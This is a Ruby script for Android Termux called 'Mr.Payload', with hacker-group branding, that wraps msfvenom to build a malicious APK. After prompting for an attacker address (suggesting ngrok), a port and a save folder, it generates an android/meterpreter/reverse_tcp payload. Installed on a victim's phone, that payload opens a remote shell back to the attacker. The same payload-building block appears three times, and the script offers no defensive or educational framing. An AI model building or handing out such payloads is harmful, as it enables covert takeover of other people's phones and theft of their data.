#!/data/data/com.termux/files/bin/ruby
system("clear")
puts "  
                               -s+sMm+hs-
                            `+dMMNmMMMMMMdo-
                          `oNMMMMMMMMMMMMMMMms-::`
                       .::mMMMMMMMMMMMMMMMMMMMMmhm+
                      :NhNMMMMMMMMMMMMMMMMMMMMMMMMMh..
                    :+dMMMMMMMMMMMMMMMMMMMMMMMNMMMMMNy/
                   :NmMMMMMMMMMMMMMMMMMMMMMMMNNNMMMMMMMo
                   dMMMMMMMMMMMMMMMMMMMMMNNMMMMNNMMMMMMM
                  .MMMMMMMMMMMMMMMMMMMNNNNNMMMMMNNNMMMMN
                  .MMMMMMMMMMMMNMMMNNMMMMMMNNMMMMMMMMMMM
                  -MMMMMMNMNNMMNNMMMMMMMNMMMMMMMMMMMMMMN
                  /MMMMNNMMMNNMMNNMMNMMMMMMMMMMMMMMMMMMo
                  `mMNNMMNMMMNNMMMMMMMMMMMMMMMMMMMMMMMM.
                   :NMNdMNNMMMMMMMMMMMMMMMMMMMMMMMMNNMN`
                    +NN+o//+shNNm/NMMMMMMMMMMNmhyhN+mMd
                     /NNs.     ` .NMMMMM+:+:.`    .hMh`
                      +MMN-     /NMMMMMMN+`     `ymMs
                     `hMMh.:osddNMMhyMNyMMMmhso/sNsN-
                     oMMdMMMMMMmNMMN./-yMMMMMMMMm+mMN-
                     `oy+oNMMMMMMMMMh.-NMMMMMNMm.ssy-
                        `o-hMhMMNMMNmNNmNMMmM:o.o-
                         o+ .:mN:MMy-+/::NN:o- /o
                         .No   `.+o-     `   `sh`
                          +Ns/s``      `` `./sy`
                           -mNMsyo:Nm-:Nd:Mhmy
                            `yMMMMNMMNNMNNMMh`
                             `+hhhyyysssssso.
                            :NNh+`      `:smM+
                            -MMMMNhoohhyNMMMMm`
                            `mMMMNdo+ys:+yNMMN`
                             :o+-          .::"   
        
system("ruby /data/data/com.termux/files/home/Mr.Payload/logo/logo.rb")
puts "     ❌-------------------------------------------------------❌ "
system " echo '   			  PAYLOAD CREATOR' | lolcat"
puts "             ❌-----------------------------------------❌     "
puts " "
puts " "
puts
puts "\t\t\t   \e[1m\e[33m Name\e[31m     : \e[32m\e[36mM\e[32mr.Payload"
puts "\t\t\t   \e[1m\e[33m Platform\e[31m : \e[32m\e[36mA\e[32mndroid \e[36mT\e[32mermux"
puts "\t\t\t   \e[1m\e[33m Code\e[31m     : \e[32mR\e[31mu\e[32mby"
puts "\t\t\t   \e[1m\e[33m Sec.Code\e[31m : \e[32m8h\e[31m4\e[32mi"
puts "\t\t\t   \e[1m\e[33m Coded by\e[31m : \e[36mSutariya Parixit"
puts "\t\t\t   \e[1m\e[33m Site\e[31m     : \e[32mbhai\e[31m4\e[32myou\e[33m.\e[32mblogspot\e[33m.\e[32mcom"
puts "\t\t\t   \e[1m\e[33m Date\e[31m     : \e[32m7\e[31m-\e[33mjan\e[31m-\e[32m2018\e[0m"
puts
puts 
puts
system " echo      '             ❌-----------------------------------------❌' | lolcat     "
puts " \t\033[1m\033[33m               \e[32m[ \033[31m3\033[33mv3Ryth1n9 \033[31m1\033[33m5 \033[31mP\033[33m0551613 \e[32m]\e[33m     \033[0m"
puts "             ❌-----------------------------------------❌     "
puts
puts
puts 
puts "\e[1m\e[33m[ \e[36mCommand\e[33m ]    :-"
puts
puts
puts "\e[0m\e[1m\t\t     1)\e[32m Payload\e[0m "
puts
puts "\e[1m\t\t     2)\e[32m Exit\e[0m "
puts
puts
puts
print "\e[1m\e[33mWhat is Your Choice (\e[0m 1 \e[33m\e[1mor\e[0m 2 \e[33m\e[1m) \e[32m: \e[0m"

payload = gets.chomp
case payload
when "1"
	system("clear")
	puts
	puts
      puts " \e[1m\e[32mCopy Your inet addr... \e[0m"
	puts
	puts
	
      system("ifconfig")
	puts
	puts
	puts " \e[1m\e[31m[ 3RR0R ] : \e[32mYour inet addr not showing bcoz your data connection is off so make sure your internet is on. then copy inet addr and paste it.. or you can use ngrok address\e[0m"
	puts
	puts
      print "\e[1m\e[33minet addr \n\n(LHOST) :\e[31m $\e[0m\e[1m "
         alhost = gets.chomp
	system("clear")
	puts
	puts "\e[1m\e[33m \t\t  ❌..[ Enter Specific Port ]..❌\e[0m"
	puts
	puts
	print "\e[1m\e[33mTarget Port \e[31m( \e[36mContact Babaji For More Details..!!!\e[31m )\n\n\e[1m\e[36me.g.,  \e[32m4444\e[0m"
	print "\e[33m\n\n\e[1m(LPORT) :\e[31m $\e[0m\e[1m "
	alport = gets.chomp
	system("clear")
	puts
	puts "\e[1m\e[33m \t\t  ❌..[ Payload Making Location ]..❌\e[0m"
	puts
	puts "\e[0m\n\n\e[1m\e[32me.g.,\e[36mSave Payload in SdCard to past below Command... !!!"
	puts "\e[0m\n\t\t\         \e[1m\e[33m /sdcard  "
	print "\e[33m\n\n\e[1mLocation :\e[31m $\e[0m\e[1m "
	alocation = gets.chomp

      puts 
	puts
	puts "❎ Mr. Payload   ❎\n❎ Coded by 8h4i ❎\n❎ Do Not Copy Or Modify Without Permission ❎"
	puts
	puts
	puts "(\e[32m Installing Setup ... !\e[0m )"

	puts
	puts "\e[1m\e[0m[ Making Payload by Mr.Payload ]      \e[31m\e[1m( \e[36mwait...!!!\e[31m)"
	puts
	puts
      system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{alhost} LPORT=#{alport} R > #{alocation}/P4y104d.apk")

      puts "❎ Successful Created ❎"
	puts "❎ D0n3 !!! ❎"
	puts
	puts

when "Payload"
	system("clear")
	puts
	puts
      puts " \e[1m\e[32mCopy Your inet addr... \e[0m"
	puts
	puts
	
      system("ifconfig")
	puts
	puts
	puts " \e[1m\e[31m[ 3RR0R ] : \e[32mYour inet addr not showing bcoz your data connection is off so make sure your internet is on.  then copy inet addr and paste it..or you can use ngrok address\e[0m"
	puts
	puts
      print "\e[1m\e[33minet addr \n\n(LHOST) :\e[31m $\e[0m\e[1m "
         alhost = gets.chomp
	system("clear")
	puts
	puts "\e[1m\e[33m \t\t  ❌..[ Enter Specific Port ]..❌\e[0m"
	puts
	puts
	print "\e[1m\e[33mTarget Port \e[31m( \e[36mContact Babaji For More Details..!!!\e[31m )\n\n\e[1m\e[36me.g.,  \e[32m4444\e[0m"
	print "\e[33m\n\n\e[1m(LPORT) :\e[31m $\e[0m\e[1m "
	alport = gets.chomp
	system("clear")
	puts
	puts "\e[1m\e[33m \t\t  ❌..[ Payload Making Location ]..❌\e[0m"
	puts
	puts "\e[0m\n\n\e[1m\e[32me.g.,\e[36mSave Payload in SdCard to past below Command... !!!"
	puts "\e[0m\n\t\t\         \e[1m\e[33m /sdcard  "
	print "\e[33m\n\n\e[1mLocation :\e[31m $\e[0m\e[1m "
	alocation = gets.chomp

      puts 
	puts
	puts "❎ Mr. Payload   ❎\n❎ Coded by 8h4i ❎\n❎ Do Not Copy Or Modify Without Permission ❎"
	puts
	puts
	puts "(\e[32m Installing Setup ... !\e[0m )"

	puts
	puts "\e[1m\e[0m[ Making Payload by Mr.Payload ]      \e[31m\e[1m( \e[36mwait...!!!\e[31m)"
	puts
	puts
      system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{alhost} LPORT=#{alport} R > #{alocation}/P4y104d.apk")

      puts "❎ Successful Created ❎"
	puts "❎ D0n3 !!! ❎"
	puts
	puts
when "payload"
	system("clear")
	puts
	puts
      puts " \e[1m\e[32mCopy Your inet addr... \e[0m"
	puts
	puts
	
      system("ifconfig")
	puts
	puts
	puts " \e[1m\e[31m[ 3RR0R ] : \e[32mYour inet addr not showing bcoz your data connection is off so make sure your internet is on. then copy inet addr and paste it..or you can use ngrok address\e[0m"
	puts
	puts
      print "\e[1m\e[33minet addr \n\n(LHOST) :\e[31m $\e[0m\e[1m "
         alhost = gets.chomp
	system("clear")
	puts
	puts "\e[1m\e[33m \t\t  ❌..[ Enter Specific Port ]..❌\e[0m"
	puts
	puts
	print "\e[1m\e[33mTarget Port \e[31m( \e[36mContact Babaji For More Details..!!!\e[31m )\n\n\e[1m\e[36me.g.,  \e[32m4444\e[0m"
	print "\e[33m\n\n\e[1m(LPORT) :\e[31m $\e[0m\e[1m "
	alport = gets.chomp
	system("clear")
	puts
	puts "\e[1m\e[33m \t\t  ❌..[ Payload Making Location ]..❌\e[0m"
	puts
	puts "\e[0m\n\n\e[1m\e[32me.g.,\e[36mSave Payload in SdCard to past below Command... !!!"
	puts "\e[0m\n\t\t\         \e[1m\e[33m /sdcard  "
	print "\e[33m\n\n\e[1mLocation :\e[31m $\e[0m\e[1m "
	alocation = gets.chomp

      puts 
	puts
	puts "❎ Mr. Payload   ❎\n❎ Coded by 8h4i ❎\n❎ Do Not Copy Or Modify Without Permission ❎"
	puts
	puts
	puts "(\e[32m Installing Setup ... !\e[0m )"

	puts
	puts "\e[1m\e[0m[ Making Payload by Mr.Payload ]      \e[31m\e[1m( \e[36mwait...!!!\e[31m)"
	puts
	puts
      system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{alhost} LPORT=#{alport} R > #{alocation}/P4y104d.apk")

      puts "\e[1m\e[33m❎ Successful Created ❎"
	puts
	puts "\e[1m\e[32m❎ D0n3 !!! ❎"
	puts
	puts
else "2"
puts
puts
system "echo ----------------------------------------------------------: | lolcat "
puts
puts "\e[1m\t   \e[33m We Are Bull Anonymous...Expect Us !!!\e[0m"
puts
puts "\e[1m\t    \e[32m    Our Weapon is a Danger Idea !!!"
puts
puts " \e[1m\t\t\e[31m   Everything is Possible \e[0m "
puts
system "echo ----------------------------------------------------------: | lolcat"
puts
puts
puts
system "exit"
end

